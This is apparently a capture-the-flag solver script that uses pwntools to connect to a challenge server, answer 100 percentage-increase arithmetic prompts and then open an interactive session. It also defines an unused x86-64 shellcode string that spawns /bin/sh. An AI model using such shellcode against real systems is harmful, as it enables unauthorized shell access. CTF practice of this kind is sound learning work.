from pwn import struct, remote

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

def p32(x):
    return struct.pack('I', x)
def p64(x):
    return struct.pack('Q', x)

r = remote('120.114.62.209', 2407)

r.recvlines(8)

r.recvline(1)
base = r.recvline().decode().split(" ")[-1].replace("\n", '')
p = r.recvline().decode().split(" ")[-1].replace('%', '').replace("\n", '')
r.recvuntil(b':')
ans = int(int(base)*(int(p)+100)/100)
r.sendline(str(ans).encode())


for _ in range(99):
    print(_)
    r.recvline(1)
    base = r.recvline().decode().split(" ")[-1].replace("\n", '')
    p = r.recvline().decode().split(" ")[-1].replace('%', '').replace("\n", '')
    r.recvuntil(b':')
    ans = int(int(base)*(int(p)+100)/100)
    r.sendline(str(ans).encode())

r.interactive()